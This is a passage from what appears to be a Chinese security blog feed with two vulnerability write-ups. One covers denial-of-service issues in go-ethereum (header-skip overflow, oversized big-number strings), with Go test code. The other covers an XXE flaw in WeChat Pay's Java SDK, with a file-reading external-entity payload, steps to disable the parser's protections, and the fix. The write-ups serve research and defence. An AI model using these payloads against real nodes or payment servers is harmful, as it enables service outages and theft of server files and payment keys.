        bv, rcost := p.fcClient.RequestProcessed(costs.baseCost + query.Amount*costs.reqCost)
        pm.server.fcCostStats.update(msg.Code, query.Amount, rcost)
        return p.SendBlockHeaders(req.ReqID, bv, headers)
</code></pre><p>eth/handler.go 365-385 此处已修复</p>
<pre><code>        case query.Origin.Hash != (common.Hash{}) &amp;&amp; !query.Reverse:
                // Hash based traversal towards the leaf block
                var (
                    current = origin.Number.Uint64()
                    next    = current + query.Skip + 1
                )
                if next &lt;= current {
                    infos, _ := json.MarshalIndent(p.Peer.Info(), &quot;&quot;, &quot;  &quot;)
                    p.Log().Warn(&quot;GetBlockHeaders skip overflow attack&quot;, &quot;current&quot;, current, &quot;skip&quot;, query.Skip, &quot;next&quot;, next, &quot;attacker&quot;, infos)
                    unknown = true
                } else {
                    if header := pm.blockchain.GetHeaderByNumber(next); header != nil {
                        if pm.blockchain.GetBlockHashesFromHash(header.Hash(), query.Skip+1)[query.Skip] == query.Origin.Hash {
                            query.Origin.Hash = header.Hash()
                        } else {
                            unknown = true
                        }
                    } else {
                        unknown = true
                    }
                }
</code></pre><hr>
<h3 id="SetString导致的OOM拒绝服务"><a href="#SetString导致的OOM拒绝服务" class="headerlink" title="SetString导致的OOM拒绝服务"></a>SetString导致的OOM拒绝服务</h3><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>根据分析，go语言中在使用math.big.Rat.SetString的时候，如果对传入的需要转换的函数没有相应的检测的时候，在传入其值为一个很大的浮点数的字符串的时候，就可能导致CPU耗尽的拒绝服务。<br>big.NewInt(0).SetString同样存在</p>
<h5 id="测试样例"><a href="#测试样例" class="headerlink" title="测试样例"></a>测试样例</h5><p>这里简单调用下该模块，检查其对传入的很大的浮点型字符串时的处理</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main
<span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"fmt"</span>
    <span class="token string">"math/big"</span>
    <span class="token string">"os"</span>
<span class="token punctuation">)</span>
<span class="token keyword">func</span>  <span class="token function">Test</span><span class="token punctuation">(</span>test <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    num<span class="token punctuation">,</span> success <span class="token operator">:=</span> <span class="token function">new</span><span class="token punctuation">(</span>big<span class="token punctuation">.</span>Rat<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">SetString</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> success <span class="token punctuation">{</span>
        fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Args<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Args<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>
        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token function">Test</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
</code></pre>
<p>测试结果图：<br><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15522370181287.jpg" alt="-w1256"><br>此处可以明显看到通过OS传入的浮点型参数1e111111111，此时CPU升到100%</p>
<p>不过当浮点数</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">type</span> txdata <span class="token keyword">struct</span> <span class="token punctuation">{</span>
        AccountNonce <span class="token builtin">string</span> <span class="token string">`json:"nonce"`</span>
        Price        <span class="token builtin">string</span> <span class="token string">`json:"gasPrice"`</span>
        GasLimit     <span class="token builtin">string</span> <span class="token string">`json:"gas"`</span>
        Recipient    <span class="token builtin">string</span> <span class="token string">`json:"to"`</span>
        Amount       <span class="token builtin">string</span> <span class="token string">`json:"value"`</span>
        Payload      <span class="token builtin">string</span> <span class="token string">`json:"input"`</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">var</span> dec txdata

    data <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"{\"nonce\":\"2\",\"gasPrice\":1000000000000000000,\"gas\":\"50000\",\"to\":\"0x3fac0b8a3d21f8565b7446c6cc9e932badfb186c\",\"value\":\"20000\",\"input\":\"0x\"}"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Unmarshal</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dec<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    price <span class="token operator">:=</span> big<span class="token punctuation">.</span><span class="token function">NewInt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    price<span class="token punctuation">.</span><span class="token function">SetString</span><span class="token punctuation">(</span>dec<span class="token punctuation">.</span>Price<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h5 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>看过测试用例后，这里我们实际分析一个最近看到的公链上漏洞。</p>
<ul>
<li>定位漏洞<br>这里根据代码审计中最简单的漏洞定位方法，因为知道了math.big.SetString存在问题,这里就去寻找，然后察看是否有可疑参数传入<br>这里我们定位到了<br>go-ethernum/cmd/geth/accountcmd.go 文件中</li>
</ul>
<pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">signTx</span><span class="token punctuation">(</span>ctx <span class="token operator">*</span>cli<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">{</span>
    prikey <span class="token operator">:=</span> ctx<span class="token punctuation">.</span><span class="token function">Args</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>prikey<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>
        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"{error1}"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> errors<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"no prikey"</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    key<span class="token punctuation">,</span> err <span class="token operator">:=</span> crypto<span class="token punctuation">.</span><span class="token function">LoadECDSA</span><span class="token punctuation">(</span>prikey<span class="token punctuation">)</span>
    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"{error2}"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> err
    <span class="token punctuation">}</span>
    jsonstr <span class="token operator">:=</span> ctx<span class="token punctuation">.</span><span class="token function">GlobalString</span><span class="token punctuation">(</span>utils<span class="token punctuation">.</span>PasswordFileFlag<span class="token punctuation">.</span>Name<span class="token punctuation">)</span>
    log<span class="token punctuation">.</span><span class="token function">Info</span><span class="token punctuation">(</span>jsonstr<span class="token punctuation">)</span>
    <span class="token keyword">type</span> txdata <span class="token keyword">struct</span> <span class="token punctuation">{</span>
        AccountNonce <span class="token builtin">string</span> <span class="token string">`json:"nonce"`</span>
        Price        <span class="token builtin">string</span> <span class="token string">`json:"gasPrice"`</span>
        GasLimit     <span class="token builtin">string</span> <span class="token string">`json:"gas"`</span>
        Recipient    <span class="token builtin">string</span> <span class="token string">`json:"to"`</span>
        Amount       <span class="token builtin">string</span> <span class="token string">`json:"value"`</span>
        Payload      <span class="token builtin">string</span> <span class="token string">`json:"input"`</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">var</span> dec txdata
    <span class="token keyword">if</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Unmarshal</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>jsonstr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>dec<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//go的json解析</span>
        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"{error3}"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> err
    <span class="token punctuation">}</span>
    nonce<span class="token punctuation">,</span> err <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">ParseUint</span><span class="token punctuation">(</span>dec<span class="token punctuation">.</span>AccountNonce<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"{error4}"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> err
    <span class="token punctuation">}</span>
    amount <span class="token operator">:=</span> big<span class="token punctuation">.</span><span class="token function">NewInt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    amount<span class="token punctuation">.</span><span class="token function">SetString</span><span class="token punctuation">(</span>dec<span class="token punctuation">.</span>Amount<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    price <span class="token operator">:=</span> big<span class="token punctuation">.</span><span class="token function">NewInt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    price<span class="token punctuation">.</span><span class="token function">SetString</span><span class="token punctuation">(</span>dec<span class="token punctuation">.</span>Price<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    gas <span class="token operator">:=</span> big<span class="token punctuation">.</span><span class="token function">NewInt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    gas<span class="token punctuation">.</span><span class="token function">SetString</span><span class="token punctuation">(</span>dec<span class="token punctuation">.</span>GasLimit<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    tx <span class="token operator">:=</span> types<span class="token punctuation">.</span><span class="token function">NewTransaction</span><span class="token punctuation">(</span>nonce<span class="token punctuation">,</span> common<span class="token punctuation">.</span><span class="token function">HexToAddress</span><span class="token punctuation">(</span>dec<span class="token punctuation">.</span>Recipient<span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">,</span> gas<span class="token punctuation">,</span> price<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>dec<span class="token punctuation">.</span>Payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
    s <span class="token operator">:=</span> types<span class="token punctuation">.</span><span class="token function">NewEIP155Signer</span><span class="token punctuation">(</span>big<span class="token punctuation">.</span><span class="token function">NewInt</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sign<span class="token punctuation">,</span> err <span class="token operator">:=</span> types<span class="token punctuation">.</span><span class="token function">GetRowTransaction</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> tx<span class="token punctuation">,</span> key<span class="token punctuation">)</span>
    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"{error5}"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> err
    <span class="token punctuation">}</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"{"</span> <span class="token operator">+</span> sign <span class="token operator">+</span> <span class="token string">"}"</span><span class="token punctuation">)</span>
</code></pre>
<p>简单的看了下，此处是对以太坊交易的功能，稍微理下流程：<br>转账请求：</p>
<p>进行请求的时候，可以有三种方式：<br>调用JSON-RPC</p>
<pre><code>curl -X POST -H &quot;Content-Type&quot;:application/json --data &#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;: [{                                                                               
  &quot;from&quot;: &quot;0xde1e758511a7c67e7db93d1c23c1060a21db4615&quot;,
  &quot;to&quot;: &quot;0xd64a66c28a6ae5150af5e7c34696502793b91ae7&quot;,
  &quot;value&quot;: &quot;0x1&quot;
}],
&quot;id&quot;:67}&#39; 172.25.0.10:8545
</code></pre><p>调用js console</p>
<pre><code>eth.sendTransaction({&quot;from&quot;:eth.accounts[0],to:eth.accounts[1],value:web3.toWei(10,&#39;ether&#39;)})
</code></pre><p>调用web3.js ，实质还是调用了js console API</p>
<pre class=" language-python"><code class="language-python">web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>sendTransaction<span class="token punctuation">(</span><span class="token string">"from"</span><span class="token punctuation">:</span>eth<span class="token punctuation">.</span>accounts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>to<span class="token punctuation">:</span>eth<span class="token punctuation">.</span>accounts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>value<span class="token punctuation">:</span>web3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'ether'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p>流程如下：</p>
<ul>
<li>用户输入转账的地址和转入的地址和转出的金额</li>
<li>系统通过转出的地址的私钥对转账信息进行签名（用于证明这 笔交易确实有本人进行）</li>
<li>系统对交易信息进行验证</li>
<li>把这笔交易入到本地的txpool中（就是缓存交易池）</li>
<li>把交易信息广播给其它节点<br>借用下seebug的图：<br><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525294348646.jpg" alt="-w830"></li>
</ul>
<p>在用户输入调用web3.js后，传入参数进行交易，在此处调用ethapi接口：<br>internal/ethapi/api.go 1071</p>
<pre class=" language-go"><code class="language-go"><span class="token function">unc</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>PublicTransactionPoolAPI<span class="token punctuation">)</span> <span class="token function">SendTransaction</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> args SendTxArgs<span class="token punctuation">)</span> <span class="token punctuation">(</span>common<span class="token punctuation">.</span>Hash<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token comment" spellcheck="true">// Look up the wallet containing the requested signer</span>
    account <span class="token operator">:=</span> accounts<span class="token punctuation">.</span>Account<span class="token punctuation">{</span>Address<span class="token punctuation">:</span> args<span class="token punctuation">.</span>From<span class="token punctuation">}</span>

    wallet<span class="token punctuation">,</span> err <span class="token operator">:=</span> s<span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">AccountManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span>
    <span class="token operator">...</span><span class="token operator">...</span>
</code></pre>
<p>通过from来调取传入的账户地址</p>
<pre class=" language-go"><code class="language-go">account <span class="token operator">:=</span> accounts<span class="token punctuation">.</span>Account<span class="token punctuation">{</span>Address<span class="token punctuation">:</span> args<span class="token punctuation">.</span>From<span class="token punctuation">}</span><span class="token comment" spellcheck="true">//接收from参数</span>
wallet<span class="token punctuation">,</span> err <span class="token operator">:=</span> s<span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">AccountManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//判断account是否存在</span>

<span class="token keyword">func</span> <span class="token punctuation">(</span>am <span class="token operator">*</span>Manager<span class="token punctuation">)</span> <span class="token function">Find</span><span class="token punctuation">(</span>account Account<span class="token punctuation">)</span> <span class="token punctuation">(</span>Wallet<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</code></pre>
<p>通过交易信息生成type包</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>args <span class="token operator">*</span>SendTxArgs<span class="token punctuation">)</span> <span class="token function">toTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span>types<span class="token punctuation">.</span>Transaction <span class="token punctuation">{</span>
    <span class="token keyword">if</span> args<span class="token punctuation">.</span>To <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> types<span class="token punctuation">.</span><span class="token function">NewContractCreation</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">.</span>Nonce<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">*</span>big<span class="token punctuation">.</span>Int<span class="token punctuation">)</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>Value<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">*</span>big<span class="token punctuation">.</span>Int<span class="token punctuation">)</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>Gas<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">*</span>big<span class="token punctuation">.</span>Int<span class="token punctuation">)</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>GasPrice<span class="token punctuation">)</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>Data<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> types<span class="token punctuation">.</span><span class="token function">NewTransaction</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">.</span>Nonce<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">.</span>To<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">*</span>big<span class="token punctuation">.</span>Int<span class="token punctuation">)</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>Value<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">*</span>big<span class="token punctuation">.</span>Int<span class="token punctuation">)</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>Gas<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">*</span>big<span class="token punctuation">.</span>Int<span class="token punctuation">)</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>GasPrice<span class="token punctuation">)</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>Data<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>对交易进行签名</p>
<pre class=" language-go"><code class="language-go">signed<span class="token punctuation">,</span> err <span class="token operator">:=</span> wallet<span class="token punctuation">.</span><span class="token function">SignTx</span><span class="token punctuation">(</span>account<span class="token punctuation">,</span> tx<span class="token punctuation">,</span> chainID<span class="token punctuation">)</span>
</code></pre>
<p>最后提交交易</p>
<pre class=" language-go"><code class="language-go">    <span class="token keyword">return</span> <span class="token function">submitTransaction</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> s<span class="token punctuation">.</span>b<span class="token punctuation">,</span> signed<span class="token punctuation">)</span>
</code></pre>
<p>在这里推测是使用了big.NewInt.SetString函数，导致了此处的OOM造成了拒绝服务的风险。但是单独测试的后期并没复现成功，存在点问题，可能根本原因不在这，只在节点上测试成功。误打误撞的找到了这个节点漏洞。</p>
<h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>在客户端console中，使用对应的转账函数，此时使用其中的转账函数，将其中的gasPrice、gasvalue、value的值使用为对应的16进制长数据<br>将导致CPU占用。</p>
<pre class=" language-go"><code class="language-go">eth<span class="token punctuation">.</span><span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525447646588.jpg" alt="-w956"><br><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525447843242.jpg" alt="-w934"></p>
<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><p>在内存资源不足的情况下，程序会自动退出。</p>
<pre><code>goroutine 1340 [chan receive]:
github.com/ethereum/go-ethereum/p2p/discover.(*udp).
</code></pre><p>在调用math.big.Rat.SetString的时候，浮点数过大会不解析，同样不会造成影响。<br><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525564158976.jpg" alt="-w710"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><pre><code>https://blog.csdn.net/fpcc/article/details/81050976
https://tianyun6655.github.io/2017/09/24/以太坊源码交易/
https://www.colabug.com/3485978.html
https://cloud.tencent.com/developer/section/1143071
https://www.jianshu.com/p/1b0ffb58f565
https://github.com/zsfelfoldi/go-ethereum/wiki/Light-Ethereum-Subprotocol-%28LES%29
https://paper.seebug.org/656/
</code></pre>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[XXE 示例及利用-java—SDK-1]]></title>
      <url>/2019/01/28/Web%E6%B8%97%E9%80%8F/XXE/XXE%E5%AE%9E%E4%BE%8B%E5%8F%8A%E5%88%A9%E7%94%A82/</url>
      <content type="html"><![CDATA[<p>[TOC]</p>
<h1 id="XXE实例分析"><a href="#XXE实例分析" class="headerlink" title="XXE实例分析"></a>XXE实例分析</h1><p>在接着之前对XXE的了解和学习，但一直在实战中都没遇到，正好这段时间在同事的渗透工作中又遇到了微信SDK的XXE漏洞，便趁着这个机会结合之前对微信SDK中的XXE漏洞，总结一波。</p>
<h2 id="ex1"><a href="#ex1" class="headerlink" title="ex1"></a>ex1</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><ul>
<li>微信SDK XXE漏洞分析1</li>
</ul>
<p>没有找到原漏洞代码，看到原漏洞修复后代码：</p>
<pre><code>https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip
</code></pre><p>在这个案例中，漏洞逻辑为：<br>微信在JAVA版本的SDK中提供callback回调功能，用来帮助商家接收异步付款结果，该接口接受XML格式的数据，攻击者可以构造恶意的回调数据（XML格式）来窃取商家服务器上的任何文件，一般支付服务器均为核心服务器，出现XXE导致任意文件。另外，一旦攻击者获得了关键支付的安全密钥（md5-key和商家信息，将可以直接实现0元支付购买任何商品。</p>
<p>因为白盒分析java实在有点强人所难，所以站在前人的肩膀上，一步到位，先看看出现这个漏洞的函数：</p>
<pre><code>src/main/java/com/github/wxpay/sdk/WXPayUtil文件
public static Map&lt;String, String&gt; xmlToMap(String strXML) throws Exception {
        try {
            Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;();
            DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder();
            InputStream stream = new ByteArrayInputStream(strXML.getBytes(&quot;UTF-8&quot;));
            org.w3c.dom.Document doc = documentBuilder.parse(stream);
            doc.getDocumentElement().normalize();
            NodeList nodeList = doc.getDocumentElement().getChildNodes();
            for (int idx = 0; idx &lt; nodeList.getLength(); ++idx) {
                Node node = nodeList.item(idx);
                if (node.getNodeType() == Node.ELEMENT_NODE) {
                    org.w3c.dom.Element element = (org.w3c.dom.Element) node;
                    data.put(element.getNodeName(), element.getTextContent());
                }
            }
            try {
                stream.close();
            } catch (Exception ex) {
                // do nothing
            }
            return data;
        } catch (Exception ex) {
            WXPayUtil.getLogger().warn(&quot;Invalid XML, can not convert to map. Error message: {}. XML content: {}&quot;, ex.getMessage(), strXML);
            throw ex;
        }

    }
</code></pre><p>这里 可以看出xmlToMap 方法用作将string转换成map,所用的xml解析器直接处理了xml字符串，这种直接处理xml字符串，在服务端没有禁止外部dtd应用的时候，造成了XXE漏洞。</p>
<ul>
<li><p>详情分析</p>
<pre><code>Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;(); 
这个地方使用了java 中的hashmap，（Hash算法就是根据某个算法将一系列目标对象转换成地址，当要获取某个元素的时候，只需要将目标对象做相应的运算获得地址，直接获取。）
对hashmap不熟悉的朋友可以看一下 https://www.cnblogs.com/dreamroute/p/3843600.html
</code></pre><p>关键解析出现在以下</p>
<pre><code>org.w3c.dom.Document doc = documentBuilder.parse(stream);
doc.getDocumentElement().normalize();
</code></pre><p>其中，strXML的内存中数据流使用parse函数处理，跟踪parse函数</p>
<pre><code>  public Document parse(InputStream is)
      throws SAXException, IOException {
      if (is == null) {
          throw new IllegalArgumentException(&quot;InputStream cannot be null&quot;);
      }

      InputSource in = new InputSource(is);
      return parse(in);
  }
</code></pre><p>return的parse（in） 类似于xml解析器 将xml转换为xmlDOM，涉及到到DOM解析XML，详情可以参考下</p>
<pre><code>https://blog.csdn.net/guchuanhang/article/details/51866114
</code></pre><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3></li>
</ul>
<p>测试代码</p>
<pre><code>package com.github.wxpay.sdk;
import java.util.Map;
public class test1 {

    public static void TestXxe(){
        String xmlstr = &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt; \n&quot; +
                &quot;&lt;!DOCTYPE xxe [\n&quot; +
                &quot;&lt;!ELEMENT name ANY &gt;\n&quot; +
                &quot;&lt;!ENTITY xxe SYSTEM \&quot;file://1.txt\&quot; &gt;]&gt;\n&quot; +
                &quot;&lt;root&gt;\n&quot; +
                &quot;&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&quot; +
                &quot;&lt;/root&gt;&quot;;
        try {
            System.out.println(xmlstr);
            System.out.println(&quot;+++++++++++++++++=&quot;);
            //System.out.println(WXPayUtil.isSignatureValid(xmlstr,config.getkey()));
            Map&lt;String,String&gt; hm = WXPayUtil.xmlToMap(xmlstr);
            System.out.println(&quot;+++++++++++++++++=&quot;);
            System.out.println(hm);

        }catch (Exception e){
            e.printStackTrace();
        }

    }

    public static void main(String[] argvs){
        System.out.println(&quot;11111&quot;);
        test2 test3 = new test2();
        test3.Test2();
        //WXPayUtil WXXxe = new WXPayUtil();//调用存在漏洞的代码
        //WXXxe.mapToXml();
        TestXxe();


    }
}
</code></pre><p>在下载的漏洞示例代码中，已经是更新后的代码了，所以为了使漏洞复现，得注释掉其中部分禁止函数。</p>
<p>当配置documentBuilderFactory.setFeature(“<a href="http://apache.org/xml/features/disallow-doctype-decl&quot;" target="_blank" rel="noopener">http://apache.org/xml/features/disallow-doctype-decl&quot;</a>, true)为true时， 完全禁止DTD实体的使用</p>
<pre><code>在 com.github.wxpay.sdk.WXPayXmlUtil函数中，进行了安全配置
documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); 

报错：[Fatal Error] :2:10: 将功能 &quot;http://apache.org/xml/features/disallow-doctype-decl&quot; 设置为“真”时, 不允许使用 DOCTYPE。
</code></pre><p>单独将该配置该为false，可以使用内部实体调用</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe &quot;11111111&quot; &gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;

正常反馈
{name=111111}
</code></pre><p>使用外部实体时，因为本例子中使用的其他防护措施中，导致了禁止外部实体,测试时可以将以下防护注释掉。这个时候就可以正常进行外部实体注入。</p>
<h3 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h3><pre><code>src/main/java/com/github/wxpay/sdk/WXPayXmlUtil中

documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
